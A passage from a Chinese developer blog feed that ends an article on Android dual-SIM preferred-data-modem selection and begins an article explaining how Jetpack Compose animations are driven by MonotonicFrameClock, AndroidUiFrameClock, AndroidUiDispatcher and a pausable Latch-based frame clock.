        // Only setPreferredDataModem if the phoneId equals to current mPreferredDataPhoneId
        logl("sendRilCommands: setPreferredDataModem - phoneId: " + phoneId);
        mRadioConfig.setPreferredDataModem(mPreferredDataPhoneId, message);
    }
}
</code></pre>
<h2 data-id="heading-11">总结：决策流程图</h2>
<pre><code class="hljs language-text" lang="text">用户操作/系统事件
    ↓
onEvaluate()
    ↓
updatePreferredDataPhoneId()
    ├─ 1. 有紧急呼叫? → 使用紧急呼叫卡
    ├─ 2. 有语音通话? → (条件满足)使用语音卡
    ├─ 3. 有自动选择? → 使用自动选择卡
    └─ 4. 否则 → 使用主数据卡
    ↓
根据 Modem 能力选择方式
    ├─ HAL_COMMAND_PREFERRED_DATA
    │   ├─ 所有 Phone 标记 active
    │   └─ setPreferredDataModem(phoneId)
    │
    └─ HAL_COMMAND_ALLOW_DATA
        ├─ 选择激活的 Phone (最多 mMaxDataAttachModemCount)
        │   ├─ 语音通话中的
        │   ├─ 有网络请求的
        │   └─ 首选数据卡
        └─ setDataAllowed(phoneId, true/false)
    ↓
Modem 执行射频资源分配
</code></pre>
<p>关键就是 <strong><code>onEvaluate()</code> → <code>updatePreferredDataPhoneId()</code> → <code>sendRilCommands()</code></strong> 这条主线！</p>
<h3 data-id="heading-12"><strong>sendRilCommands() 具体干了什么？</strong></h3>
<ol>
<li>
<p><strong>检查 phoneId 有效性</strong></p>
</li>
<li>
<p><strong>创建 Message 用于接收 Modem 响应</strong> (<code>EVENT_MODEM_COMMAND_DONE</code>)</p>
</li>
<li>
<p><strong>根据 Modem 能力选择命令</strong>:</p>
<ul>
<li>旧 Modem: 调用 <code>setDataAllowed(phoneId, active)</code> 单独控制每个 Phone</li>
<li>新 Modem: 调用 <code>setPreferredDataModem(modemId)</code> 告诉 Modem 首选哪个</li>
</ul>
</li>
<li>
<p><strong>通过 RIL → RadioProxy → HIDL/AIDL → RILD → Vendor RIL</strong> 发送命令到 Modem</p>
</li>
<li>
<p><strong>Modem 执行射频资源切换</strong>，允许/禁止特定 SIM 卡的数据连接</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Compose原理七之动画]]></title>    <link>https://juejin.cn/post/7602464510607769626</link>    <guid>https://juejin.cn/post/7602464510607769626</guid>    <pubDate>2026-02-03T14:45:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602464510607769626" data-draft-id="7600291308409733174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Compose原理七之动画"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2026-02-03T14:45:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="裴云飞"/> <meta itemprop="url" content="https://juejin.cn/user/3734361144570285"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Compose原理七之动画
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3734361144570285/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    裴云飞
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:45:07.000Z" title="Tue Feb 03 2026 14:45:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、前言</h2>
<p>Compose动画原理跟副作用和协程上下文息息相关，不熟悉副作用，可以查看<a href="https://juejin.cn/post/7599017594519322650" target="_blank" title="https://juejin.cn/post/7599017594519322650">Compose原理五之副作用</a>；不熟悉协程上下文，可以查看<a href="https://juejin.cn/post/7600291308409716790" target="_blank" title="https://juejin.cn/post/7600291308409716790">Compose原理六之Kotlin协程上下文</a>。</p>
<h2 data-id="heading-1">二、帧驱动机制：MonotonicFrameClock</h2>
<h3 data-id="heading-2">2、1 MonotonicFrameClock 接口定义</h3>
<p><code>MonotonicFrameClock</code> 是 Compose 定义的一个 <code>CoroutineContext.Element</code>，用于提供帧同步服务：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// MonotonicFrameClock.kt</span>

<span class="hljs-comment">/**
 * 提供显示帧的时间源，以及在下一帧执行操作的能力
 * 可用于与显示刷新率匹配，或者同步工作到期望的帧率
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MonotonicFrameClock</span> : <span class="hljs-type">CoroutineContext.Element</span> {
    <span class="hljs-comment">/**
     * 挂起直到请求新帧，立即调用 onFrame 并传入帧时间（纳秒）
     * 
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">frameTimeNanos</span>: <span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R
    
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> key: CoroutineContext.Key&lt;*&gt;
        <span class="hljs-keyword">get</span>() = Key

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> Key : CoroutineContext.Key&lt;MonotonicFrameClock&gt;
}
</code></pre>
<p><strong>关键点：</strong></p>
<ol>
<li>它是一个 <code>CoroutineContext.Element</code>，可以通过 <code>+</code> 添加到协程上下文</li>
<li>它提供了 <code>withFrameNanos</code> 挂起函数，用于等待下一帧</li>
<li>使用 <code>MonotonicFrameClock.Key</code> 作为唯一标识</li>
</ol>
<h3 data-id="heading-3">2、2 从协程上下文获取帧时钟</h3>
<p>任何在协程中运行的代码，都可以通过 <code>coroutineContext</code> 获取帧时钟：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// MonotonicFrameClock.kt</span>
<span class="hljs-meta">@ExperimentalComposeApi</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> CoroutineContext.monotonicFrameClock: MonotonicFrameClock
    <span class="hljs-keyword">get</span>() = <span class="hljs-keyword">this</span>[MonotonicFrameClock]
        ?: error(
            <span class="hljs-string">"A MonotonicFrameClock is not available in this CoroutineContext. "</span> +
                <span class="hljs-string">"Callers should supply an appropriate MonotonicFrameClock using withContext."</span>
        )

<span class="hljs-comment">// 顶级挂起函数</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">frameTimeNanos</span>: <span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R =
    coroutineContext.monotonicFrameClock.withFrameNanos(onFrame)
</code></pre>
<p><strong>使用示例：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">LaunchedEffect(<span class="hljs-built_in">Unit</span>) {
    <span class="hljs-comment">// 等待下一帧</span>
    <span class="hljs-keyword">val</span> frameTime = withFrameNanos { it }
    println(<span class="hljs-string">"当前帧时间: <span class="hljs-variable">$frameTime</span>"</span>)
}
</code></pre>
<h3 data-id="heading-4">2、3 AndroidUiFrameClock</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AndroidUiFrameClock</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">constructor</span>(
    <span class="hljs-keyword">val</span> choreographer: Choreographer,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> dispatcher: AndroidUiDispatcher?,
) : androidx.compose.runtime.MonotonicFrameClock {

    <span class="hljs-keyword">constructor</span>(choreographer: Choreographer) : <span class="hljs-keyword">this</span>(choreographer, <span class="hljs-literal">null</span>)

    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R {
        <span class="hljs-keyword">val</span> uiDispatcher =
            dispatcher ?: coroutineContext[ContinuationInterceptor] <span class="hljs-keyword">as</span>? AndroidUiDispatcher
        <span class="hljs-keyword">return</span> suspendCancellableCoroutine { co -&gt;
            <span class="hljs-comment">// Important: this callback won't throw, and AndroidUiDispatcher counts on it.</span>
            <span class="hljs-keyword">val</span> callback =
                Choreographer.FrameCallback { frameTimeNanos -&gt;
                    co.resumeWith(runCatching { onFrame(frameTimeNanos) })
                }                
            <span class="hljs-comment">// 注册帧回调</span>
            <span class="hljs-keyword">if</span> (uiDispatcher != <span class="hljs-literal">null</span> &amp;&amp; uiDispatcher.choreographer == choreographer) {
                <span class="hljs-comment">// 情况 A：使用 AndroidUiDispatcher 注册</span>
                uiDispatcher.postFrameCallback(callback)
                co.invokeOnCancellation { uiDispatcher.removeFrameCallback(callback) }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 情况 B：直接使用 Choreographer 注册</span>
                choreographer.postFrameCallback(callback)
                co.invokeOnCancellation { choreographer.removeFrameCallback(callback) }
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-5">为什么需要两种注册方式？</h4>
<p>核心目的是为了解决<strong>帧内任务调度的顺序和合并</strong>问题。</p>
<h4 data-id="heading-6">情况 A：使用 AndroidUiDispatcher 注册</h4>
<p>当我们在 Compose 环境中（通常在 <code>AndroidUiDispatcher.Main</code> 上下文中）调用 <code>withFrameNanos</code> 时，会进入这个分支。</p>
<p><code>AndroidUiDispatcher</code> 实现了一个非常重要的机制：<strong>Trampoline Dispatch（跳板分发）</strong>。</p>
<p>如果不使用 <code>uiDispatcher</code>，每次调用 <code>withFrameNanos</code> 都会直接向 Choreographer 注册一个 FrameCallback。</p>
<p><strong>问题场景：</strong>
假设你在同一帧内多次调用 <code>withFrameNanos</code>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 假设这里直接使用 choreographer.postFrameCallback</span>
withFrameNanos { ... } <span class="hljs-comment">// 注册回调 1</span>
withFrameNanos { ... } <span class="hljs-comment">// 注册回调 2</span>
withFrameNanos { ... } <span class="hljs-comment">// 注册回调 3</span>
</code></pre>
<p>Choreographer 会收到 3 个回调，并在下一帧依次执行它们。这虽然没错，但可能效率不高，且无法控制执行顺序与 UI 布局/绘制的关系。</p>
<p><strong>优化方案（AndroidUiDispatcher）：</strong>
<code>AndroidUiDispatcher</code> 将这些回调<strong>收集起来</strong>，并确保它们在**贪婪的跳板分发（greedy trampoline dispatch）**之后执行。</p>
<p>看看 <code>AndroidUiDispatcher.postFrameCallback</code> 的实现：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// AndroidUiDispatcher.android.kt</span>
<span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">postFrameCallback</span><span class="hljs-params">(callback: <span class="hljs-type">Choreographer</span>.<span class="hljs-type">FrameCallback</span>)</span></span> {
    synchronized(lock) {
        toRunOnFrame.add(callback) <span class="hljs-comment">// 1. 只是添加到列表，不立即注册到 Choreographer</span>
        <span class="hljs-keyword">if</span> (!scheduledFrameDispatch) {
            scheduledFrameDispatch = <span class="hljs-literal">true</span>
            choreographer.postFrameCallback(dispatchCallback) <span class="hljs-comment">// 2. 只有第一次才注册一个统一的回调</span>
        }
    }
}
</code></pre>
<p>这意味着，无论你调用多少次 <code>withFrameNanos</code>，<code>AndroidUiDispatcher</code> 只会向系统 Choreographer 注册<strong>一个</strong> <code>dispatchCallback</code>。</p>
<p>当这个 <code>dispatchCallback</code> 执行时：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// AndroidUiDispatcher.android.kt</span>
<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">doFrame</span><span class="hljs-params">(frameTimeNanos: <span class="hljs-type">Long</span>)</span></span> {
    handler.removeCallbacks(<span class="hljs-keyword">this</span>)
    performTrampolineDispatch() <span class="hljs-comment">// 1. 先执行所有普通的协程任务（launch 的任务）</span>
    performFrameDispatch(frameTimeNanos) <span class="hljs-comment">// 2. 再执行所有注册的 FrameCallback</span>
}
</code></pre>
<ol>
<li><strong>优先处理普通任务</strong>：先执行完所有排队的普通协程任务（Trampoline Dispatch）。</li>
<li><strong>后处理帧任务</strong>：然后再执行 <code>withFrameNanos</code> 注册的任务。</li>
</ol>
<p>这保证了在执行动画帧（<code>withFrameNanos</code>）之前，该帧内所有的状态更新和准备工作（通过普通 <code>launch</code> 提交的任务）都已经完成。</p>
<p>如果当前正在处理一帧，并且在处理过程中又调用了 <code>withFrameNanos</code>，如果直接注册到 Choreographer，可能会导致意外的行为（取决于 Choreographer 的实现，通常是下一帧）。但在 <code>AndroidUiDispatcher</code> 中，它能更好地管理这些重入情况，确保逻辑清晰。</p>
<h4 data-id="heading-7">情况 B：直接使用 Choreographer 注册</h4>
<p>这个分支用于那些<strong>没有运行在 AndroidUiDispatcher 上下文</strong>中的协程。</p>
<p>例如：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 在 IO 线程或者自定义的 Scope 中</span>
CoroutineScope(Dispatchers.IO).launch {
    <span class="hljs-comment">// 这里没有 AndroidUiDispatcher</span>
    withFrameNanos { ... } 
}
</code></pre>
<p>或者使用了一个不属于当前 <code>AndroidUiFrameClock</code> 的 <code>choreographer</code>。</p>
<p>在这种情况下，Compose 无法利用 <code>AndroidUiDispatcher</code> 的优化机制，只能回退到最基础的行为：直接向 Android 系统的 <code>Choreographer</code> 注册回调。</p>
<p>这保证了 <code>withFrameNanos</code> 可以在任何协程上下文中使用，不仅仅是在 Compose 的 UI 线程中。</p>
<h4 data-id="heading-8">两者的对比</h4>



































<table><thead><tr><th align="left">特性</th><th align="left">uiDispatcher.postFrameCallback (情况 A)</th><th align="left">choreographer.postFrameCallback (情况 B)</th></tr></thead><tbody><tr><td align="left"><strong>触发条件</strong></td><td align="left">当前协程上下文包含 <code>AndroidUiDispatcher</code></td><td align="left">其他协程上下文 (如 IO, Default)</td></tr><tr><td align="left"><strong>系统回调数</strong></td><td align="left"><strong>合并为 1 个</strong> (无论注册多少次)</td><td align="left"><strong>N 个</strong> (注册多少次就有多少个)</td></tr><tr><td align="left"><strong>执行顺序</strong></td><td align="left">在所有普通协程任务执行<strong>之后</strong></td><td align="left">取决于 Choreographer 的调度</td></tr><tr><td align="left"><strong>性能</strong></td><td align="left">更高 (减少 JNI 调用和对象分配)</td><td align="left">普通</td></tr><tr><td align="left"><strong>适用场景</strong></td><td align="left">Compose UI 渲染、动画</td><td align="left">通用帧同步任务</td></tr></tbody></table>
<h4 data-id="heading-9">图解执行流</h4>
<h4 data-id="heading-10">情况 A: 在 Compose UI 线程中</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-attr">[协程 1]</span> withFrameNanos -&gt; 注册到 AndroidUiDispatcher 列表
<span class="hljs-selector-attr">[协程 2]</span> withFrameNanos -&gt; 注册到 AndroidUiDispatcher 列表
<span class="hljs-selector-attr">[协程 3]</span> launch { ... } -&gt; 注册到 AndroidUiDispatcher Trampoline 队列

       ... 等待 VSync ...

<span class="hljs-selector-attr">[Choreographer]</span> 触发 dispatchCallback<span class="hljs-selector-class">.doFrame</span>()
       |
       v
<span class="hljs-selector-attr">[AndroidUiDispatcher]</span>
       <span class="hljs-number">1</span>. <span class="hljs-built_in">performTrampolineDispatch</span>()
          -&gt; 执行 <span class="hljs-selector-attr">[协程 3]</span> 的任务
       
       <span class="hljs-number">2</span>. <span class="hljs-built_in">performFrameDispatch</span>()
          -&gt; 执行 <span class="hljs-selector-attr">[协程 1]</span> 的回调 (恢复协程 <span class="hljs-number">1</span>)
          -&gt; 执行 <span class="hljs-selector-attr">[协程 2]</span> 的回调 (恢复协程 <span class="hljs-number">2</span>)
</code></pre>
<h4 data-id="heading-11">情况 B: 在其他线程中</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[协程 IO]</span> withFrameNanos -&gt; 直接注册到 Choreographer

       ... 等待 VSync ...

<span class="hljs-selector-attr">[Choreographer]</span> 触发 FrameCallback
       |
       v
恢复 <span class="hljs-selector-attr">[协程 IO]</span>
</code></pre>
<h3 data-id="heading-12">2、4 PausableMonotonicFrameClock</h3>
<p><code>PausableMonotonicFrameClock</code>实现了<code>MonotonicFrameClock</code>，构造函数中<code>frameClock</code>就是<code>AndroidUiFrameClock</code>，使用<code>Latch</code>可以暂停帧循环。<strong>在activity暂停期间，Recomposer主循环挂起，不再执行重组工作，不再调度动画帧，节省资源。</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PausableMonotonicFrameClock</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> frameClock: MonotonicFrameClock) :
    MonotonicFrameClock {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> latch = Latch()
   
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> isPaused: <span class="hljs-built_in">Boolean</span>
        <span class="hljs-keyword">get</span>() = !latch.isOpen
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">pause</span><span class="hljs-params">()</span></span> {
        latch.closeLatch()
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">resume</span><span class="hljs-params">()</span></span> {
        latch.openLatch()
    }

    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">frameTimeNanos</span>: <span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R {
        latch.await()
        <span class="hljs-keyword">return</span> frameClock.withFrameNanos(onFrame)
    }
}
</code></pre>
<h4 data-id="heading-13">2、4、1 核心机制：Latch 门闩</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Latch</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> lock = makeSynchronizedObject()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> awaiters = mutableListOf&lt;Continuation&lt;<span class="hljs-built_in">Unit</span>&gt;&gt;()  <span class="hljs-comment">// 等待的协程列表</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> spareList = mutableListOf&lt;Continuation&lt;<span class="hljs-built_in">Unit</span>&gt;&gt;()  <span class="hljs-comment">// 备用列表</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> _isOpen = <span class="hljs-literal">true</span>  <span class="hljs-comment">// 初始状态是打开的</span>
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li><code>awaiters</code>：存储所有因为 latch 关闭而挂起的协程的 <code>Continuation</code></li>
<li><code>_isOpen</code>：门闩状态，<code>true</code> = 打开（允许通过），<code>false</code> = 关闭（阻塞）</li>
</ul>
<h4 data-id="heading-14">2、4、2 <code>await()</code> - 等待门闩打开</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">await</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">if</span> (isOpen) <span class="hljs-keyword">return</span>  <span class="hljs-comment">// 如果已经打开，立即返回</span>
    
    suspendCancellableCoroutine&lt;<span class="hljs-built_in">Unit</span>&gt; { co -&gt;
        synchronized(lock) { awaiters.add(co) }  <span class="hljs-comment">// 将当前协程加入等待列表</span>
        
        co.invokeOnCancellation { 
            synchronized(lock) { awaiters.remove(co) }  <span class="hljs-comment">// 取消时移除</span>
        }
    }
}
</code></pre>
<p><strong>工作原理</strong>：</p>
<ul>
<li>如果 latch 是打开的，立即返回，不挂起</li>
<li>如果 latch 是关闭的，挂起当前协程，将 <code>Continuation</code> 加入 <code>awaiters</code> 列表</li>
<li>协程会一直挂起，直到 <code>openLatch()</code> 被调用</li>
</ul>
<h4 data-id="heading-15">2、4、3 <code>openLatch()</code> - 打开门闩</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">openLatch</span><span class="hljs-params">()</span></span> {
    synchronized(lock) {
        <span class="hljs-keyword">if</span> (isOpen) <span class="hljs-keyword">return</span>  <span class="hljs-comment">// 如果已经打开，直接返回</span>
        
        <span class="hljs-comment">// 交换列表，避免恢复的协程立即再次 await 时干扰其他协程的恢复</span>
        <span class="hljs-keyword">val</span> toResume = awaiters
        awaiters = spareList
        spareList = toResume
        _isOpen = <span class="hljs-literal">true</span>
        
        <span class="hljs-comment">// 恢复所有等待的协程</span>
        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> until toResume.size) {
            toResume[i].resume(<span class="hljs-built_in">Unit</span>)
        }
        toResume.clear()
    }
}
</code></pre>
<p><strong>工作原理</strong>：</p>
<ul>
<li>将 <code>_isOpen</code> 设为 <code>true</code></li>
<li>恢复 <code>awaiters</code> 列表中所有挂起的协程</li>
<li>使用列表交换技巧，避免并发问题</li>
</ul>
<h4 data-id="heading-16">2、4、4 <code>closeLatch()</code> - 关闭门闩</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">closeLatch</span><span class="hljs-params">()</span></span> {
    synchronized(lock) { _isOpen = <span class="hljs-literal">false</span> }
}
</code></pre>
<p><strong>工作原理</strong>：</p>
<ul>
<li>将 <code>_isOpen</code> 设为 <code>false</code></li>
<li>之后调用 <code>await()</code> 的协程都会被挂起</li>
</ul>
<h4 data-id="heading-17">2、4、5 PausableMonotonicFrameClock 如何使用 Latch</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PausableMonotonicFrameClock</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> frameClock: MonotonicFrameClock) :
    MonotonicFrameClock {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> latch = Latch()  <span class="hljs-comment">// 创建一个 latch</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">pause</span><span class="hljs-params">()</span></span> {
        latch.closeLatch()  <span class="hljs-comment">// 关闭 latch</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">resume</span><span class="hljs-params">()</span></span> {
        latch.openLatch()  <span class="hljs-comment">// 打开 latch</span>
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">frameTimeNanos</span>: <span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R {
        latch.await()  <span class="hljs-comment">// 等待 latch 打开</span>
        <span class="hljs-keyword">return</span> frameClock.withFrameNanos(onFrame)  <span class="hljs-comment">// 委托给实际的 frameClock</span>
    }
}
</code></pre>
<h4 data-id="heading-18">2、4、6 详细步骤说明</h4>
<p><strong>步骤 1：正常运行</strong></p>
